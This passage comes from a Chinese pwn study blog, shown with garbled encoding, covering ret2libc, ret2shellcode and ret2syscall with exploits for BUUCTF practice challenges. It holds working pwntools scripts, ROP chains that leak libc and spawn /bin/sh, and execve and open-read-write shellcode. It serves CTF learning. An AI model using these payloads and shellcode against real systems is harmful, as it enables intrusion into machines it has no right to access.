p.sendlineafter(b&#x27;Input:\n&#x27;,payload)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#search()ç”¨äºåœ¨libcä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²çš„åœ°å€ã€‚</span></span><br><span class="line"><span class="comment">#next() æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–ä¸€ä¸ªè¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºè·å–æœç´¢ç»“æœä¸­ç¬¬ä¸€ä¸ªåŒ¹é… /bin/sh çš„åœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(str_bin_sh_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹é¢˜3ï¼šbuu-jarvisoj-level3-x64"><a href="#ä¾‹é¢˜3ï¼šbuu-jarvisoj-level3-x64" class="headerlink" title="ä¾‹é¢˜3ï¼šbuu jarvisoj_level3_x64"></a>ä¾‹é¢˜<code>3</code>ï¼š<code>buu</code> <code>jarvisoj_level3_x64</code></h3><p>â€‹	è¯¥é¢˜æ˜¯<code>64</code>ä½ç¨‹åºï¼Œä¸ç¬¬äºŒé¢˜åªæœ‰ä¸€å¤„ä¸åŒã€‚<code>32</code>ä½é€šè¿‡æ ˆä¼ å‚ï¼Œ<code>64</code>ä½é€šè¿‡å¯„å­˜å™¨ä¼ å‚ã€‚æ•…åœ¨<code>write</code>å‡½æ•°æ³„æ¼å’Œè°ƒç”¨<code>system</code>å‡½æ•°çš„æ—¶å€™éœ€è¦ç”¨å¯„å­˜å™¨ä¼ å‚ã€‚å‚¨å­˜å‚æ•°çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨åˆ†åˆ«ä¸º<code>rdi,rsi,rdx</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348901.png" alt="image-20231222200640812"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347028.png" alt="image-20231222200701146"></p>
<p>â€‹	æˆ‘åªæ‰¾åˆ°äº†å‰ä¸¤ä¸ªå¯„å­˜å™¨å¯¹åº”çš„<code>gadget</code>åœ°å€ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>rdx</code>ä¸­çš„æ®‹ç•™å€¼ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>read</code>è°ƒç”¨å‰ï¼Œ<code>rdx</code>ä¾ç„¶ä¿ç•™ä¸Šä¸€ä¸ª<code>write</code>å‡½æ•°çš„å‚æ•°<code>0x200</code>ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348407.png" alt="image-20240308135618147" style="zoom: 67%;" />

<p><code>exp</code>å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26311</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">rsi_addr = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi_addr)+p64(write_got)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#å› ä¸ºè¿™é‡Œçš„rsi_addrçš„åœ°å€æ˜¯pop rsi ; pop r15 ; retï¼Œæ‰€ä»¥éœ€è¦æœ‰ä¸€ä¸ªp64(0)è¢«æ”¾å…¥r15å¯„å­˜å™¨ä¸­</span></span><br><span class="line">payload += p64(write_plt)+p64(mian_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi_addr)+p64(str_bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2shellcodeå­¦ä¹ æ€»ç»“</title>
    <url>/2023/12/09/ret2shellcode%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="ä»€ä¹ˆæ˜¯ret2shellcode"><a href="#ä»€ä¹ˆæ˜¯ret2shellcode" class="headerlink" title="ä»€ä¹ˆæ˜¯ret2shellcode"></a>ä»€ä¹ˆæ˜¯<code>ret2shellcode</code></h3><p>â€‹	<code>ret2shellcode</code>ï¼Œå³<code>return to shellcode</code>æ„æ€æ˜¯åŠ«æŒå‡½æ•°è¿”å›åœ°å€ä¸º<code>shellcode</code>çš„åœ°å€ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œ<code>shellcode</code>ï¼Œæ‹¿åˆ°<code>shell</code>ã€‚</p>
<h3 id="NXä¿æŠ¤"><a href="#NXä¿æŠ¤" class="headerlink" title="NXä¿æŠ¤"></a><code>NX</code>ä¿æŠ¤</h3><span id="more"></span>

<blockquote>
<p>â€‹	<strong><code>NX</code>ä¿æŠ¤ï¼šå°†æ•°æ®ï¼ˆå †ï¼Œæ ˆï¼‰æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥<code>shellcode</code>æ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶<code>cpu</code>å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</strong></p>
</blockquote>
<h4 id="mprotectå‡½æ•°"><a href="#mprotectå‡½æ•°" class="headerlink" title="mprotectå‡½æ•°"></a><code>mprotect</code>å‡½æ•°</h4><ul>
<li><p>å¼€å¯äº†<code>NX</code>ä¿æŠ¤ï¼Œå†…å­˜é¡µä¸èƒ½æ‰§è¡Œã€‚å¦‚æœèƒ½åœ¨ç¨‹åºä¸­æ‰¾åˆ°<code>mprotect</code>å‡½æ•°ï¼Œæˆ‘ä»¬ä¾¿å¯åˆ©ç”¨è¯¥å‡½æ•°ä¿®æ”¹å†…å­˜é¡µçš„è®¿é—®æƒé™ï¼Œç„¶åä¾¿å¯åœ¨å†…å­˜é¡µå†™å…¥<code>shellcode</code>ï¼Œè·å¾—<code>shell</code>ã€‚</p>
</li>
<li><p>ä¸‹é¢æ˜¯<code>mprotect</code>å‡½æ•°åŸå‹</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr,<span class="type">size_t</span> len,<span class="type">int</span> prot)</span>;</span><br><span class="line"><span class="comment">//addræŒ‡å‘è¦ä¿®æ”¹çš„å†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º4096(0x1000)å­—èŠ‚</span></span><br><span class="line"><span class="comment">//lenæ˜¯è¦ä¿®æ”¹çš„å†…å­˜é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span></span><br><span class="line"><span class="comment">//protè¡¨ç¤ºè¦ä¿®æ”¹æˆä»€ä¹ˆæƒé™ï¼ˆ4ï¼Œ2ï¼Œ1 å¯è¯»å¯å†™å¯æ‰§è¡Œï¼‰</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨<code>ida</code>ä¸­<code>Ctrl+s</code>å¯ä»¥æŸ¥çœ‹å„ä¸ªæ®µçš„èµ·å§‹åœ°å€</li>
</ul>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><code>shellcode</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">open(flag_addr,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">//flag_addræ˜¯è¦æ‰“å¼€æ–‡ä»¶çš„åœ°å€</span></span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//ä¸€ä¸ªè¿›ç¨‹æœ‰é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦0ï¼Œ1ï¼Œ2ã€‚å½“æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶åï¼Œæ–°æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å°±æ˜¯3ï¼Œåé¢å†æ‰“å¼€çš„æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ä»¥æ­¤ç±»æ¨</span></span><br><span class="line">    <span class="comment">//addrå¯ä»¥æ˜¯ä»»æ„æ™®é€šåœ°å€</span></span><br><span class="line">    <span class="comment">//0x50æ˜¯è¦è¯»çš„å†…å®¹çš„å¤§å°</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//æ–‡ä»¶æè¿°ç¬¦0ï¼Œ1ï¼Œ2 åˆ†åˆ«æ˜¯ï¼šæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„addrè¦ä¸readå‡½æ•°ä¸­çš„addrä¸€æ ·</span></span><br></pre></td></tr></table></figure>

<h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a><code>32</code>ä½</h4><p>â€‹	ç³»ç»Ÿè°ƒç”¨å­˜å‚¨å‚æ•°çš„å‰<code>3</code>ä¸ªå¯„å­˜å™¨ï¼š<code>ebx,ecx,edx</code>ï¼Œå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å¯åœ¨<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>æ–‡ä»¶ä¸­æŸ¥çœ‹ï¼Œ<code>eax</code>å­˜å‚¨ç³»ç»Ÿè°ƒç”¨å·ï¼Œæ‰§è¡Œ<code>int 0x80</code>æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</p>
<h5 id="execve"><a href="#execve" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx </span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx ;ebxä¸­ç°åœ¨ä¸º0</span><br><span class="line">push ebx ;å…ˆæŠŠä¸€ä¸ª0å‹å…¥æ ˆï¼Œç”¨æ¥æˆªæ–­å­—ç¬¦ä¸²</span><br><span class="line">push 0x68732f2f ;æŠŠ//shå‹å…¥æ ˆ</span><br><span class="line">push 0x6e69622f ;æŠŠ/binå‹å…¥æ ˆ</span><br><span class="line">mov ebx,esp ;æŠŠespæŒ‡å‘çš„åœ°å€èµ‹ç»™äº†ebxï¼Œæ­¤æ—¶ebxä¸­æ”¾çš„æ˜¯/bin//shçš„åœ°å€</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ”¾ä¸€å¼ å¸ˆçˆ¶çš„å›¾ç‰‡ï¼Œæœ‰åŠ©äºç†è§£æ€ä¹ˆæŠŠ<code>/bin//sh</code>çš„åœ°å€æ”¾å…¥<code>ebx</code>ä¸­</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353394.png" alt="image-20230926230802945"></p>
<h5 id="open-read-write"><a href="#open-read-write" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h4 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a><code>64</code>ä½</h4><p>â€‹	ç³»ç»Ÿè°ƒç”¨å­˜å‚¨å‚æ•°çš„å‰<code>6</code>ä¸ªå¯„å­˜å™¨ï¼š<code>rdi,rsi,rdx,r10,r8,r9</code>ï¼Œå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å¯åœ¨<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>æ–‡ä»¶ä¸­æŸ¥çœ‹ï¼Œ<code>rax</code>å­˜å‚¨ç³»ç»Ÿè°ƒç”¨å·ï¼Œæ‰§è¡Œ<code>syscall</code>æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</p>
<h5 id="execve-1"><a href="#execve-1" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f #/bin(2f62696e) /sh(2f7368)</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h5 id="open-read-write-1"><a href="#open-read-write-1" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>â€‹	æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>pwntools</code>ä¸­çš„<code>asm</code>æŠŠå†™å¥½çš„æ±‡ç¼–ä»£ç ç›´æ¥è½¬æ¢æˆæœºå™¨ç </p>
<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a><code>others_shellcode</code></h3><p>è¿™é“é¢˜ç›´æ¥å‘é€<code>shellcode</code>å³å¯ï¼Œ<code>exp</code>å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25752</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351737.png" alt="image-20231210222035500"></p>
<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a><code>ciscn_2019_n_5</code></h3><p>æ‹¿åˆ°é¢˜ç›®ï¼Œå…ˆæ£€æŸ¥ä¿æŠ¤ï¼Œæ²¡å¼€ä¿æŠ¤ï¼Œ<code>64</code>ä½ç¨‹åº</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353809.png" alt="image-20231210134205669"></p>
<p>æ‹–å…¥<code>ida</code>ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353640.png" alt="image-20231210134506057"></p>
<p>è¿è¡Œç¨‹åºï¼Œæœ‰ä¸¤æ¬¡è¾“å…¥çš„åœ°æ–¹</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351745.png" alt="image-20231210134611131"></p>
<p><code>Shift+F12</code>æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œæ²¡æœ‰æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„<code>/bin/sh</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132353023.png" alt="image-20231210134823032"></p>
<p>å†çœ‹å³è¾¹å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰<code>system</code>å‡½æ•°</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351752.png" alt="image-20231210134953135"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210140546109](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352089.png)</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬å¯ä»¥å…ˆæŠŠ```shellcode```å†™åˆ°```bss```æ®µï¼Œç„¶ååœ¨æ ˆæº¢å‡ºåŠ«æŒå‡½æ•°è¿”å›åœ°å€ä¸º```shellcode```çš„èµ·å§‹åœ°å€</span><br><span class="line"></span><br><span class="line">è®¡ç®—åç§»é‡ä¸º```0x28```</span><br><span class="line"></span><br><span class="line">![1](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352098.png)</span><br><span class="line"></span><br><span class="line">```exp```å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ciscn_2019_n_5&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26032)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall                </span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x601080</span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351950.png" alt="image-20231210150043471"></p>
<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a><code>ez_pz_hackover_2016</code></h3><p>æ‹¿åˆ°é¢˜ç›®ï¼Œæ£€æŸ¥ä¿æŠ¤ï¼Œ<code>PIE,NX,canary</code>éƒ½æ²¡å¼€ï¼Œæ˜¯<code>32</code>ä½ç¨‹åº</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132352868.png" alt="image-20231210192130416"></p>
<p>æ‹–å…¥<code>ida</code>ä¸­ï¼Œåˆ†æé¢˜ç›®</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351088.png" alt="image-20231210200953491"></p>
<p>å…ˆè¿›å…¥<code>header</code>å‡½æ•°ä¸­çœ‹çœ‹ï¼Œå°±æ˜¯è¾“å‡ºå›¾å½¢çš„ï¼Œæ²¡ä»€ä¹ˆé—®é¢˜</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351942.png" alt="image-20231210201032463"></p>
<p>å†è¿›å…¥<code>chall</code>å‡½æ•°ä¸­çœ‹çœ‹ï¼Œæˆ‘ä»¬ä¸»è¦åˆ†æçš„åº”è¯¥å°±æ˜¯è¿™ä¸ªå‡½æ•°äº†</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351082.png" alt="image-20231210202908607"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210203253498](https://raw.githubusercontent.com/Qwen11/picture/main/202503132352393.png)</span><br><span class="line"></span><br><span class="line">è®¡ç®—ç¼“å†²åŒºåˆ°```shellcode```çš„åç§»é‡ä¸º```0x1c```</span><br><span class="line"></span><br><span class="line">![image-20231210200821951](https://raw.githubusercontent.com/Qwen11/picture/main/202503132351108.png)</span><br><span class="line"></span><br><span class="line">`exp`å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26101)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash: &#x27;)</span><br><span class="line">s_addr = int(p.recv(10),16)</span><br><span class="line">shellcode_addr = s_addr-28</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload = b&#x27;crashme\x00&#x27;+b&#x27;a&#x27;*18+p32(shellcode_addr)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132351863.png" alt="image-20231210215133554"></p>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2syscallå­¦ä¹ æ€»ç»“</title>
    <url>/2023/12/09/ret2syscall%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="å‰æçŸ¥è¯†"><a href="#å‰æçŸ¥è¯†" class="headerlink" title="å‰æçŸ¥è¯†"></a>å‰æçŸ¥è¯†</h2><h3 id="ret2syscallæ˜¯ä»€ä¹ˆ"><a href="#ret2syscallæ˜¯ä»€ä¹ˆ" class="headerlink" title="ret2syscallæ˜¯ä»€ä¹ˆ"></a><code>ret2syscall</code>æ˜¯ä»€ä¹ˆ</h3><p>â€‹	<code>ret2syscall</code>ï¼Œå³<code>return to syscall</code>ï¼Œæ„æ€æ˜¯åŠ«æŒå‡½æ•°è¿”å›åœ°å€ä¸ºé€šè¿‡<code>ROP</code>æ„é€ çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œæ‹¿åˆ°<code>shell</code>ã€‚</p>
<span id="more"></span>

<h3 id="ROPåŸç†"><a href="#ROPåŸç†" class="headerlink" title="ROPåŸç†"></a><code>ROP</code>åŸç†</h3><blockquote>
<p>â€‹	<code>ROP</code>çš„å…¨ç§°ä¸º<code>Return-oriented programming</code>ï¼Œå³<strong>è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ã€‚å…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œé€šè¿‡åˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µï¼ˆ<code>gadget</code>ï¼‰æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p>
</blockquote>
<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a><code>gadgets</code></h3><blockquote>
<p>â€‹	<code>gadgets</code>å°±æ˜¯ä»¥<code>ret</code>ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p>
</blockquote>
<h3 id="ROPæ”»å‡»æ‰§è¡Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶"><a href="#ROPæ”»å‡»æ‰§è¡Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶" class="headerlink" title="ROPæ”»å‡»æ‰§è¡Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶"></a><code>ROP</code>æ”»å‡»æ‰§è¡Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶</h3><p>1.å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</p>
<p>2.å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„<code>gadgets</code>åŠå…¶åœ°å€ã€‚</p>
